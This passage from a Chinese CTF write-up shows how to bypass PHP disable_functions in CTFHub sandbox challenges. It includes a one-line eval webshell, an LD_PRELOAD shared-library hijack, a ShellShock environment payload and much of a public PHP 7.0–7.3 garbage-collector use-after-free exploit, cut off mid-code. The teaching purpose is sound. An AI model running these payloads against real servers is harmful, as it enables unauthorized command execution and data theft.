class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CTFHub Bypass disable_function —— LD_PRELOAD</span><br><span class="line">本环境来源于AntSword-Labs</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CTFHub Bypass disable_function —— LD_PRELOAD&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;CTFHub Bypass disable_function —— LD_PRELOAD&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;本环境来源于&lt;a href=&quot;https://github.com/AntSwordProject/AntSword-Labs&quot;&gt;AntSword-Labs&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_REQUEST[&#x27;ant&#x27;]);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>即在本页面上就放了一句话木马，用蚁剑连接。在根目录发现flag，但打开是空白页面，终端命令执行也不行。还有一个readflag，打开发现是执行显示flag的命令<code>tac /flag</code>，终端执行也不行。</p><blockquote><p>tac命令与cat命令展示内容相反，用于将文件<strong>以行为单位</strong>的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。 </p></blockquote><p>方法一：用蚁剑插件的LD_PRLOAD模式</p><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant">https://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant</a></p><p>方法二：手工绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看禁用了哪些函数</span><br><span class="line">http://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=phpinfo();</span><br></pre></td></tr></table></figure><p>发现禁用了mail函数，但没禁用error_log()。所以下面利用error_log()绕过LD_PRLOAD。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_log</span>()函数向服务器错误记录、文件或远程目标发送错误信息。</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(message,type,destination,headers);</span><br></pre></td></tr></table></figure><p>先创建一个havefun.c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/readflag &gt; /tmp/havefun&quot;</span>);</span><br><span class="line">    <span class="comment">//如果/readflag运行成功将会在/tmp目录下生成一个havefun文件</span></span><br><span class="line">    <span class="comment">//system(&quot;tac /flag &gt; /tmp/havefun&quot;);</span></span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成havefun.so文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared havefun.c -o havefun.so</span><br></pre></td></tr></table></figure><p>将havefun.so文件拖入/tmp目录下，创建一个havefun.php拖入/var/www/html目录下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/havefun.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//因为mail()函数不能用，所以用函数error_log()</span></span><br></pre></td></tr></table></figure><p>现在所有的前提工作都做好了，关键是怎么执行havefun.php让它执行havefun.so再执行/readflag命令。很简单，主页面不是有一个$_REQUEST[‘ant’]吗，我们可以利用文件包含，将havefun.php文件包含在主页面，执行主页面就可执行havefun.php。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=include(&#x27;havefun.php&#x27;);</span><br></pre></td></tr></table></figure><p>执行完后会在/tmp目录下生成一个havefun文件，打开就是flag。</p><h2 id="17-2-ShellShock"><a href="#17-2-ShellShock" class="headerlink" title="17.2 ShellShock"></a>17.2 ShellShock</h2><p>例：hcfhub-web进阶-Bypass disable_function-ShellShock</p><p>跟LD_PRLOAD一样的界面，用蚁剑连接即可。发现什么目录都不给我们看，只能看/var/www/html的目录。</p><p>方法一：用蚁剑插件的apache_mode_cgi模式</p><p>点击开始，自动弹出终端。查找flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/readflag</span><br><span class="line">tac /flag</span><br></pre></td></tr></table></figure><p>方法二：手工shellshock</p><p>创建一个shell.php文件上传到/var/www/html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_hack=() &#123; :; &#125;; tac /flag &gt; /var/www/html/hack.php&quot;</span>);</span><br><span class="line"><span class="comment">//运行成功的话将会在/var/www/html下生成一个hack.php文件，里面装着flag。因为我们只能看到/var/www/html目录下的东西，所以只能把flag放在这个路径下。</span></span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span></span><br><span class="line"><span class="comment">//这次没有限制禁用mail(),所以用mail()也可。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行shell.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-6a758e43b272dbba.sandbox.ctfhub.com:10800/shell.php</span><br></pre></td></tr></table></figure><p>发现/var/www/htm目录下会生成一个hack.php。</p><h2 id="17-3-Apache-Mod-CGI"><a href="#17-3-Apache-Mod-CGI" class="headerlink" title="17.3 Apache Mod CGI"></a>17.3 Apache Mod CGI</h2><p>CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程。</p><p>MOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p><p>例：hcfhub-web进阶-Bypass disable_function-Apache Mod CGI</p><p>这个好像只能用插件？跟shellshock套路一样。</p><h2 id="17-4-PHP-FPM"><a href="#17-4-PHP-FPM" class="headerlink" title="17.4 PHP-FPM"></a>17.4 PHP-FPM</h2><blockquote><p>由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.<br>因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信<br>但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：</p><ol><li>第一个问题<br>既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.</li><li>第二个问题<br>我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.<br>那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file<br>auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.</li><li>第三个问题<br>进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?<br>FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了。</li></ol></blockquote><p>例：hcfhub-web进阶-Bypass disable_function-PHP-FPM</p><p>一样用蚁剑连接，用蚁剑插件fastcgi/php-fpm，地址选择本地的9000端口，点击开始，就会在/var/www/html下生成一个.antproxy.php文件，在蚁剑添加数据，路径加上.antproxy.php，连接成功就可找flag。</p><h2 id="17-5-GC-UAF"><a href="#17-5-GC-UAF" class="headerlink" title="17.5 GC UAF"></a>17.5 GC UAF</h2><p>方法一：蚁剑插件PHP_GC_UAF</p><p>方法二：一样用蚁剑连接，将编写好的exploit.php上传到/var/www/html上。</p><p>编写脚本exploit.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);<span class="comment">#这个写命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$ryat</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$chtg</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;chtg = <span 